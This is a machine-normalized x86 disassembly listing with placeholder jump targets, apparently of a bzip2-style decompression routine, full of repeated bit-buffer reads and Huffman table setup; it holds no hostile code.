mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc5c ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc5c ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc5c ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc5c ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov [ ebx + 0x4 ] 0x1
push 0x4
jmp r-xdata
xor eax eax
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push 0xfffffffb
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp eax 0x39
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp al 0x31
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push 0xfffffffc
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x2c ]
cmp [ ebx + 0x30 ] 0x2
mov eax [ ebx + 0x2c ]
jl r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebx + 0x24 ]
imul ecx ecx 0x186a0
add ecx 0xa
cmp eax ecx
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push 0x100
lea eax [ ebx + 0xc6c ]
push 0x0
push eax
call sub_10027650
add esp 0xc
and [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
inc [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
shl eax 0x4
add eax ebx
mov [ eax + ecx + 0xc6c ] 0x1
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp eax 0x6
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
and [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
inc [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x44 ]
jl r-xdata
mov ecx [ ebp - 0x10 ]
mov al [ ebp - 0x1c ]
inc [ ebp - 0x10 ]
mov [ ebx + ecx + 0x650e ] al
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec [ ebp - 0x34 ]
inc [ ebp - 0x34 ]
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov edx [ ebp - 0x10 ]
imul eax eax 0x102
mov cl [ ebp - 0x34 ]
add eax ebx
inc [ ebp - 0x10 ]
mov [ eax + edx + 0xab60 ] cl
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x60 ]
jl r-xdata
mov esi [ eax ]
movzx esi [ esi ]
mov edx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl edx 0x8
or edx esi
mov [ ebx + 0x1c ] edx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp esi 0x14
mov [ ebx + 0x20 ] edx
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x2c ]
cmp eax [ ecx + esi * 4 ]
jle r-xdata
mov esi [ eax ]
movzx esi [ esi ]
mov edx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl edx 0x8
or edx esi
mov [ ebx + 0x1c ] edx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x48 ]
cmp eax [ ecx + esi * 4 ]
jle r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp esi 0x14
mov [ ebp - 0x2c ] eax
mov [ ebx + 0x20 ] edx
jg r-xdata
mov esi [ eax ]
movzx esi [ esi ]
mov edx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl edx 0x8
or edx esi
mov [ ebx + 0x1c ] edx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x14
mov [ ebp - 0x2c ] eax
mov [ ebx + 0x20 ] edx
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x48 ]
shl ecx 0x2
cmp eax [ ecx + edx ]
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
and [ ebx + 0xc5c ] 0x0
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10027150
leave
retn
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
add eax 0xffffffd0
cmp [ ebx + 0x28 ] 0x0
mov [ ebx + 0x24 ] eax
push 0x1
je r-xdata
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
and [ ebx + 0xc58 ] 0x0
push eax
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
add esp 0xc
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
and [ ebp - 0x10 ] 0x0
jmp r-xdata
inc [ eax + 0xc ]
mov eax [ ebp - 0x10 ]
cmp eax 0x10
jge r-xdata
inc [ eax + 0xc ]
inc [ ebp - 0x10 ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
mov edx [ ebp - 0x50 ]
cmp [ ebp - 0x10 ] edx
jge r-xdata
inc [ eax + 0xc ]
jmp r-xdata
xor edi edi
xor cl cl
cmp [ ebp - 0x44 ] edi
jle r-xdata
and [ ebp - 0x1c ] 0x0
inc [ eax + 0xc ]
cmp [ ebp - 0x34 ] 0x14
jg r-xdata
cmp [ ebp - 0x34 ] 0x1
jl r-xdata
inc [ eax + 0xc ]
inc [ ebp - 0x3c ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
mov ecx [ ebp - 0x40 ]
sub eax [ ecx + esi * 4 ]
inc esi
mov [ ebp - 0x14 ] esi
inc [ eax + 0xc ]
mov ecx [ ebp - 0x40 ]
sub eax [ ecx + esi * 4 ]
js r-xdata
inc esi
mov [ ebp - 0x14 ] esi
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ ebp - 0x14 ]
mov edx [ ebp - 0x40 ]
sub eax [ ecx + edx ]
jmp r-xdata
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
mov ecx [ ebp - 0x10 ]
mov [ ebx + 0xfa14 ] ecx
mov ecx [ ebp - 0x1c ]
mov [ ebx + 0xfa18 ] ecx
mov ecx [ ebp - 0x3c ]
mov [ ebx + 0xfa1c ] ecx
mov ecx [ ebp - 0x60 ]
mov [ ebx + 0xfa20 ] ecx
mov ecx [ ebp - 0x44 ]
mov [ ebx + 0xfa24 ] ecx
mov ecx [ ebp - 0x50 ]
mov [ ebx + 0xfa28 ] ecx
mov ecx [ ebp - 0x64 ]
mov [ ebx + 0xfa2c ] ecx
mov ecx [ ebp - 0x24 ]
mov [ ebx + 0xfa30 ] ecx
mov ecx [ ebp - 0x28 ]
mov [ ebx + 0xfa34 ] ecx
mov ecx [ ebp - 0x54 ]
mov [ ebx + 0xfa38 ] ecx
mov ecx [ ebp - 0x30 ]
mov [ ebx + 0xfa3c ] ecx
mov ecx [ ebp - 0x18 ]
mov [ ebx + 0xfa40 ] ecx
mov ecx [ ebp - 0x20 ]
mov [ ebx + 0xfa44 ] ecx
mov ecx [ ebp - 0x74 ]
mov [ ebx + 0xfa48 ] ecx
mov ecx [ ebp - 0x34 ]
mov [ ebx + 0xfa4c ] ecx
mov ecx [ ebp - 0x80 ]
mov [ ebx + 0xfa50 ] ecx
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0xfa54 ] ecx
mov ecx [ ebp - 0x2c ]
mov [ ebx + 0xfa58 ] ecx
mov ecx [ ebp - 0x6c ]
mov [ ebx + 0xfa5c ] ecx
mov ecx [ ebp - 0x70 ]
mov [ ebx + 0xfa60 ] ecx
mov ecx [ ebp - 0x5c ]
mov [ ebx + 0xfa64 ] ecx
mov ecx [ ebp - 0x48 ]
mov [ ebx + 0xfa68 ] ecx
mov ecx [ ebp - 0x40 ]
mov [ ebx + 0xfa6c ] ecx
mov ecx [ ebp - 0x4c ]
mov [ ebx + 0xfa70 ] ecx
jmp r-xdata
imul eax eax 0x61a80
push eax
push [ esi + 0x2c ]
call [ esi + 0x24 ]
add esp 0xc
mov [ ebx + 0xc4c ] eax
jmp r-xdata
imul eax eax 0x30d40
push eax
push [ esi + 0x2c ]
call [ esi + 0x24 ]
mov [ ebx + 0xc50 ] eax
mov eax [ ebx + 0x24 ]
imul eax eax 0x186a0
inc eax
push 0x1
sar eax 0x1
push eax
push [ esi + 0x2c ]
call [ esi + 0x24 ]
add esp 0x18
cmp [ ebx + 0xc50 ] 0x0
mov [ ebx + 0xc54 ] eax
je r-xdata
cmp [ ebp - 0x10 ] 0x10
jl r-xdata
and [ ebx + 0xc68 ] 0x0
xor eax eax
cmp [ ebx + eax + 0xd6c ] 0x0
je r-xdata
cmp edx edi
mov [ ebp - 0x10 ] edi
jle r-xdata
xor eax eax
mov eax [ ebp - 0x44 ]
and [ ebp - 0x3c ] 0x0
test eax eax
jle r-xdata
cmp eax 0x102
jge r-xdata
cmp eax 0x102
jge r-xdata
js r-xdata
test eax eax
jne r-xdata
push 0xfffffffd
inc eax
cmp eax 0x100
jl r-xdata
mov ecx [ ebx + 0xc68 ]
mov [ ebx + ecx + 0xd7c ] al
inc [ ebx + 0xc68 ]
and [ ebp - 0x1c ] 0x0
jmp r-xdata
and [ ebp - 0x3c ] 0x0
jmp r-xdata
mov dl [ ebx + edi + 0x650e ]
movzx eax dl
lea eax [ ebp + eax - 0xc ]
mov cl [ eax ]
test dl dl
jbe r-xdata
mov [ ebp + eax - 0xc ] cl
inc cl
movzx eax cl
cmp eax [ ebp - 0x44 ]
jl r-xdata
mov eax [ ebx + 0xc68 ]
and [ ebp - 0x28 ] 0x0
inc eax
mov [ ebp - 0x64 ] eax
mov eax [ ebx + 0x24 ]
imul eax eax 0x186a0
mov edx 0x100
mov [ ebp - 0x30 ] eax
xor eax eax
lea edi [ ebx + 0x40 ]
mov ecx edx
[ edi ]
push 0xf
mov [ ebp - 0x10 ] edx
mov esi 0xfff
pop eax
lea edi [ ebx + 0x1eb8 ]
lea ecx [ ebx + 0xab60 ]
lea edi [ ebx + 0xf9fc ]
lea edx [ ebx + 0xc99c ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x3c ] eax
mov ecx [ ebp - 0x4c ]
mov eax [ ecx + eax * 4 ]
mov [ ebp - 0x54 ] eax
mov ecx [ ebp - 0x4c ]
mov eax [ ecx + eax * 4 ]
xor edx edx
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
cmp [ eax + ebx + 0xc6c ] 0x0
je r-xdata
mov eax [ ebx + 0xc68 ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x10
jl r-xdata
mov eax [ ebp - 0x3c ]
cmp eax [ ebp - 0x44 ]
jge r-xdata
mov [ ebx + edi + 0x1ebc ] cl
inc edi
cmp edi [ ebp - 0x50 ]
mov [ ebp - 0xc ] cl
jl r-xdata
mov esi eax
mov dl [ ebp - 0x24 ]
add dl cl
mov [ ebx + esi + 0xe7c ] dl
dec esi
dec [ ebp - 0x24 ]
jns r-xdata
lea ecx [ esi + 0x1 ]
mov [ edi ] ecx
dec eax
sub edi 0x4
test eax eax
jge r-xdata
push [ ebp - 0x60 ]
lea eax [ edx + 0x1830 ]
push [ ebp - 0x24 ]
push esi
push eax
lea eax [ edx - 0x1830 ]
push eax
mov eax [ ebp - 0x30 ]
call sub_1001ffc7
add [ ebp - 0x30 ] 0x102
mov [ edi ] esi
add esp 0x14
add edi 0x4
add edx 0x408
dec [ ebp - 0x64 ]
jne r-xdata
mov ecx [ ebp - 0x30 ]
movzx eax [ ecx + eax ]
cmp eax [ ebp - 0x24 ]
jle r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
jl r-xdata
test edi edi
je r-xdata
mov eax [ ebp - 0x74 ]
cmp eax 0x200000
jge r-xdata
cmp eax 0x1
je r-xdata
add eax 0x2
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x10 ] edi
mov al [ esi - 0x1 ]
dec dl
mov [ esi ] al
dec esi
test dl dl
ja r-xdata
mov cl al
mov [ ebp - 0x24 ] 0xf
shl cl 0x4
xor eax eax
cmp [ ebp - 0x50 ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x24 ] eax
jle r-xdata
xor eax eax
cmp [ ebp - 0x60 ] eax
push 0x20
pop esi
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x10 ] eax
jle r-xdata
cmp eax esi
jge r-xdata
mov [ ebp - 0x24 ] eax
cmp eax [ ebp - 0x18 ]
jge r-xdata
or [ ebp - 0x20 ] 0xffffffff
mov [ ebp - 0x74 ] 0x1
cmp edi 0x1
jne r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
mov eax [ ebx + 0x1e7c ]
movzx eax [ eax + ebx + 0xe7c ]
mov cl [ eax + ebx + 0xd7c ]
inc [ ebp - 0x20 ]
mov esi [ ebp - 0x20 ]
movzx eax cl
add [ ebx + eax * 4 + 0x40 ] esi
cmp [ ebx + 0x28 ] dl
je r-xdata
movzx eax [ ebx + 0x1ebc ]
mov ecx [ ebx + eax * 4 + 0xf9fc ]
mov [ ebp - 0x70 ] eax
imul eax eax 0x408
add eax ebx
lea edx [ eax + 0xb16c ]
mov [ ebp - 0x48 ] edx
lea edx [ eax + 0xe1cc ]
add eax 0xc99c
